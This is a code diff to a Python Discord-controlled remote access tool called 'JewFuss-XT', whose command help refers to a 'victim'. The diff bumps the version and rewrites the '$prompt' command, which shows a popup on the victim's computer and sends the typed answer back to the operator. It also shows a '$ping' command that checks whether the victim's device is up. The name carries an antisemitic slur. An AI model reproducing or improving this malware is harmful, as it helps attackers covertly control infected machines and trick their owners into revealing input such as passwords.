@@ -45,7 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.12" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.6.13" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 intents = discord.Intents.all()
 
@@ -112,24 +112,29 @@ async def update(ctx):
 @bot.command(help="send a popup prompt for victim to reply with, includes default response, `|` indicates start of default answer ", usage="$prompt <question> [| <default answer>]")
 async def prompt(ctx, *, question_and_default: str = ""):
     await ctx.send("✅ Prompt sent to victim. Waiting for input...")
-    
-    def show_prompt():
-        parts = question_and_default.split("|", 1)
-        question = parts[0].strip() if len(parts) >= 1 else ""
-        default = parts[1].strip() if len(parts) == 2 else ""
 
+    parts = question_and_default.split("|", 1)
+    question = parts[0].strip() if len(parts) >= 1 else ""
+    default = parts[1].strip() if len(parts) == 2 else ""
+
+    async def show_prompt_async():
         try:
-            answer = pymsgbox.prompt(text=question, title="Input Required", default=default)
+            answer = await asyncio.to_thread(
+                pymsgbox.prompt,
+                question,
+                "Input Required",
+                default
+            )
+
             if answer is None:
-                response = "User canceled the prompt."
-            else:
-                response = f"User entered: `{answer}`"
+                return "User canceled the prompt."
+            return f"User entered: `{answer}`"
+
         except Exception as e:
-            response = f"Error showing prompt: {e}"
+            return f"Error showing prompt: {e}"
 
-        asyncio.run_coroutine_threadsafe(ctx.reply(response), bot.loop)
-
-    Thread(target=show_prompt, daemon=True).start()
+    response = await show_prompt_async()
+    await ctx.reply(response)
 
 @bot.command(help="Checks if the victims device is up.", usage="$ping")
 async def ping(ctx):
